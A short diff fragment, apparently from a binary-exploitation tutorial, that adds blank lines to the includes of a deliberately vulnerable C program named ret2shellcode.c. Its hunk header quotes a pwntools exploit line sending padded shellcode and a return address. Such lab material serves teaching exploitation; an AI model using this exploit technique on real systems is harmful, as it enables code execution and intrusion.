@@ -73,7 +73,9 @@ sh.sendline(shellcode.ljust(112, 'a') + p32(buf2_addr))
 ret2shellcode.c
 
 #include <stdio.h>
+
 #include <string.h>
+
 
 char buf2[100];
 
